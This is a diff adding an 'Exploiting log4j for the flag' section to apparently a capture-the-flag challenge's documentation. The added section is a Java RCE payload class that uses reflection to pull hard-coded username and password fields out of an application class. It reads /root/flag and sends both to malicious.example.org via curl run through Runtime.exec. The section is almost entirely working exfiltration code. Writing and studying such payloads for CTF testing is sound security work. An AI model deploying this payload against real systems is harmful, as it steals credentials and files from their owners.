@@ -124,3 +124,71 @@ In the Docker environment, the username and password are set to an empty string.
 
 Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.
 
+## Exploiting log4j for the flag (after challange for testing)
+(Note: I was to lazy to write a beautiful Java code)
+
+```java
+public class RcePayload {
+    private static final String HOST = "http://malicious.example.org";
+
+    public RcePayload() {
+        try {
+            Class cookieHandlerClass = Class.forName("com.cloudEscalator.util.CookieHandler");
+            Field usernamField = cookieHandlerClass.getDeclaredField("USERNAME");
+            usernamField.setAccessible(true);
+            Field passwordField = cookieHandlerClass.getDeclaredField("PASSWORD");
+            passwordField.setAccessible(true);
+
+            String username = (String) usernamField.get(null);
+            String password = (String) passwordField.get(null);
+
+            System.out.println(String.format("Username: %s Password: %s", username, password));
+
+            // Send username and password to malicious server
+            String command = String.format("curl --insecure %s/?username=%s&password=%s", RcePayload.HOST, username, password);
+            System.out.println(command);
+            Process p = Runtime.getRuntime().exec(command);
+            p.waitFor();
+            
+            InputStream errorStream = p.getErrorStream();
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                System.out.println(line);
+            }
+
+            reader.close();
+
+
+            // Send flag to malicious server
+            File flagFile = new File("/root/flag");
+            Scanner myReader = new Scanner(flagFile);
+            String content = "";
+            while (myReader.hasNextLine()) {
+                line = myReader.nextLine();
+                content += line + "\n";
+            }
+            myReader.close();
+
+            String command2 = String.format("curl --insecure %s/?flag=%s", RcePayload.HOST, URLEncoder.encode(content, StandardCharsets.UTF_8.toString()));
+            System.out.println(command2);
+            Process p2 = Runtime.getRuntime().exec(command2);
+            p2.waitFor();
+            
+            InputStream errorStream2 = p2.getErrorStream();
+
+            BufferedReader reader2 = new BufferedReader(new InputStreamReader(errorStream2));
+            String line2;
+            while ((line2 = reader2.readLine()) != null) {
+                System.out.println(line2);
+            }
+
+            reader2.close();
+        } catch (Exception e) {
+            e.printStackTrace(System.out);
+        }
+    }
+}
+```
+
